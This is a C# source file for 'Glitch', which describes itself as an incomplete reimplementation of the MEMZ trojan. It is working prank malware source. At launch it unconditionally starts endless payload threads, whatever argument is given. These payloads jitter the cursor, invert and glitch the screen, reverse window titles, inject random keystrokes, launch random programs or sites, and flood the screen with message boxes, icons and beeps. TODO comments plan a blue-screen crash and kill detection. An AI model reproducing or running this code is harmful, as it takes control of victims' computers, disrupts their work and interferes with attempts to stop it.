using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Media;
using System.Threading;
using System.Windows.Forms;
using CC_Functions.W32;
using ImageProcessor;
using ScreenLib;

namespace Glitch
{
    internal class Program
    {
        private static readonly Random Rnd = new Random();

        public static void Main(string[] args)
        {
            args = args == null || args.Length == 0 ? new[] {"help"} : args.Select(s => s.TrimStart('-', '/', '\\')).ToArray();
            new Thread(PayloadTunnel).Start();
            new Thread(PayloadInvert).Start();
            new Thread(PayloadCursor).Start();
            new Thread(PayloadReverseText).Start();
            new Thread(PayloadKeyboard).Start();
            new Thread(PayloadSound).Start();
            new Thread(PayloadExecute).Start();
            new Thread(PayloadMessageBox).Start();
            new Thread(PayloadDrawWarnings).Start();
            new Thread(PayloadDrawErrors).Start();
            new Thread(PayloadCrazyBus).Start();
            new Thread(PayloadScreenGlitches).Start();
            switch (args[0])
            {
                case "list":
                    break;
                case "full":
                    break;
                case "run":
                    break;
                default:
                    Console.WriteLine("Invalid operator");
                    ShowHelp();
                    break;
                case "help":
                    ShowHelp();
                    break;
            }
        }

        private static void ShowHelp()
        {
            Console.WriteLine(@"CC24 - Glitch - an (incomplete) implementation of Leurak's MEMZ in C#
Usage: Glitch <command> [parameters]
Commands:
-   help
    Displays this message
-   list
    Lists all payloads
-   full
    Runs all payloads
-   run
    Run only the payloads specified in parameters");
        }

        private static void PayloadCursor()
        {
            while (true)
                try
                {
                    Thread.Sleep(200);
                    Point tmp = Cursor.Position;
                    tmp.X += Rnd.Next(-2, 4);
                    tmp.Y += Rnd.Next(-2, 4);
                    Cursor.Position = tmp;
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.ToString());
                }
        }

        private static void PayloadInvert()
        {
            while (true)
                try
                {
                    Thread.Sleep(1000);
                    using MemoryStream ms = new MemoryStream();
                    using ImageFactory imageFactory = new ImageFactory();
                    imageFactory.Load(ScreenMan.CaptureScreen())
                        .InvertColor()
                        .Save(ms);
                    ms.Position = 0;
                    using Drawer drawerBuffered = ScreenMan.GetDrawer();
                    drawerBuffered.Graphics.DrawImageUnscaled(Image.FromStream(ms), Point.Empty);
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.ToString());
                }
        }

        private static void PayloadTunnel()
        {
            Rectangle bounds = ScreenMan.GetBounds();
            Size size34 = new Size((bounds.Width / 4) * 3, (bounds.Height / 4) * 3);
            Point point34 = new Point(bounds.Width / 8, bounds.Height / 8);
            while (true)
                try
                {
                    Thread.Sleep(1000);
                    using MemoryStream ms = new MemoryStream();
                    using ImageFactory imageFactory = new ImageFactory();
                    Image tmp = ScreenMan.CaptureScreen();
                    imageFactory.Load(tmp)
                        .Resize(size34)
                        .Save(ms);
                    ms.Position = 0;
                    using Drawer drawerBuffered = ScreenMan.GetDrawer();
                    drawerBuffered.Graphics.DrawImageUnscaled(tmp, Point.Empty);
                    drawerBuffered.Graphics.DrawImageUnscaled(Image.FromStream(ms), point34);
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.ToString());
                }
        }

        private static void PayloadReverseText()
        {
            while (true)
                try
                {
                    Thread.Sleep(1000);
                    foreach (Wnd32 wnd in Wnd32.getAll())
                    {
                        string? tmp = wnd.title;
                        if (!string.IsNullOrWhiteSpace(tmp))
                            wnd.title = string.Join("", tmp.ToCharArray().Reverse());
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.ToString());
                }
        }

        private static void PayloadKeyboard() //TODO: Fix @, up-chars and numbers only
        {
            while (true)
                try
                {
                    Thread.Sleep(1000);
                    SendKeys.SendWait($"{(char) Rnd.Next(48, 90 + 1)}");
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.ToString());
                }
        }

        private static void PayloadSound()
        {
            SystemSound[] sounds = typeof(SystemSounds).GetProperties()
                .Select(s => (SystemSound) s.GetValue(null, null)).ToArray();
            while (true)
                try
                {
                    Thread.Sleep(1000);
                    sounds[Rnd.Next(sounds.Length)].Play();
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.ToString());
                }
        }

        private static void PayloadExecute()
        {
            string[] sites = Sites.SiteString.Split(new[] {"\n", "\r"}, StringSplitOptions.RemoveEmptyEntries);
            string choice = "";
            while (true)
                try
                {
                    Thread.Sleep(2000);
                    choice = sites[Rnd.Next(sites.Length)];
                    Process.Start(choice);
                }
                catch (Exception e)
                {
                    Console.WriteLine($"{e}\nChoice was: {choice}");
                }
        }

        private static void PayloadMessageBox()
        {
            while (true)
                try
                {
                    Thread.Sleep(3000);
                    new Thread(() => MessageBox.Show("Still using this computer?", "lol", MessageBoxButtons.OK,
                        MessageBoxIcon.Warning)).Start();
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.ToString());
                }
        }

        private static void PayloadDrawWarnings()
        {
            Rectangle bounds = ScreenMan.GetBounds();
            Icon icon = SystemIcons.Warning;
            int xMax = bounds.Width - icon.Width;
            int yMax = bounds.Height - icon.Height;
            while (true)
                try
                {
                    Thread.Sleep(1000);
                    using Drawer drawerBuffered = ScreenMan.GetDrawer(false);
                    drawerBuffered.Graphics.DrawIcon(icon, Rnd.Next(xMax + 1), Rnd.Next(yMax + 1));
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.ToString());
                }
        }

        private static void PayloadDrawErrors()
        {
            Icon icon = SystemIcons.Error;
            Size halfIcon = new Size(icon.Width / 2, icon.Height / 2);
            while (true)
                try
                {
                    Thread.Sleep(100);
                    Point tmp = Cursor.Position;
                    using Drawer drawerBuffered = ScreenMan.GetDrawer(false);
                    drawerBuffered.Graphics.DrawIcon(icon, tmp.X - halfIcon.Width, tmp.Y - halfIcon.Height);
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.ToString());
                }
        }

        private static void PayloadCrazyBus()
        {
            while (true)
                try
                {
                    Beep.BeepBeep(1000, Rnd.Next(1000, 6000), 200);
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.ToString());
                }
        }

        private static void PayloadScreenGlitches()
        {
            Rectangle bounds = ScreenMan.GetBounds();
            while (true)
                try
                {
                    Thread.Sleep(1000);
                    Size objSize = new Size(Rnd.Next(100, 500), Rnd.Next(100, 500));
                    int xMax = bounds.Width - objSize.Width;
                    int yMax = bounds.Height - objSize.Height;
                    using MemoryStream ms = new MemoryStream();
                    using ImageFactory imageFactory = new ImageFactory();
                    imageFactory.Load(ScreenMan.CaptureScreen())
                        .Crop(new Rectangle(new Point(Rnd.Next(xMax), Rnd.Next(yMax)), objSize))
                        .Save(ms);
                    ms.Position = 0;
                    using Drawer drawerBuffered = ScreenMan.GetDrawer(false);
                    drawerBuffered.Graphics.DrawImageUnscaled(Image.FromStream(ms), new Point(Rnd.Next(xMax), Rnd.Next(yMax)));
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.ToString());
                }
        }
    }
}
//TODO: Add BSoD functionality
//TODO: Add kill detection